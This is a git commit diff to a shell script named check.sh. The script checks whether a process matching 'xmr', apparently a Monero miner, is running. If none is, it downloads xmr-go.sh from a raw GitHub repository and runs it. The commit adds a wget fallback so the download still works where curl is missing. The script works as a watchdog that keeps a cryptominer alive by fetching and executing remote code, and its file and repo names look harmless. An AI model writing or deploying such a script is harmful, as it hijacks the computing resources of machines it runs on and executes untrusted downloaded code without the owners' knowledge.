c1d81a13232063d579158cd70a3efbba22193743
GaminnLinux <gaminnlinuxgit@proton.me>
2024-11-20 19:16:38 +0100

    Update check.sh

--- check.sh
+++ check.sh
@@ -1,8 +1,17 @@
 #!/bin/bash
+
 if pgrep "^xmr" > /dev/null
 then
     echo "it's running!"
 else
-    curl -LO https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
+    if command -v curl >/dev/null 2>&1; then
+        curl -LO https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
+    elif command -v wget >/dev/null 2>&1; then
+        wget https://raw.githubusercontent.com/spetterman66/verynicerepo/main/xmr-go.sh
+    else
+        echo "error: neither curl nor wget is installed"
+        exit 1
+    fi
+
     sh xmr-go.sh
 fi
